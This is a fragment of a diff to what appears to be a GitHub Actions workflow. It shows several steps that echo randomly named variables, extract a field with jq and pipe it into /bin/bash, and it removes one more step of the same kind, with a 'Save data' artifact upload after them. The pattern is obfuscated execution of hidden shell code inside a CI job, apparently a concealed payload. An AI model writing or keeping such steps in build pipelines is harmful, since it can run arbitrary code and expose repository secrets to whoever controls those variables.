@@ -29,7 +29,6 @@ jobs:
           echo $jew53 | jq -r .u71 | /bin/bash
           echo $f6841 | jq -r .v97 | /bin/bash
           echo $jfnae895 | jq -r .dtczg6146 | /bin/bash
-          echo $egwco5101 | jq -r .z1731 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
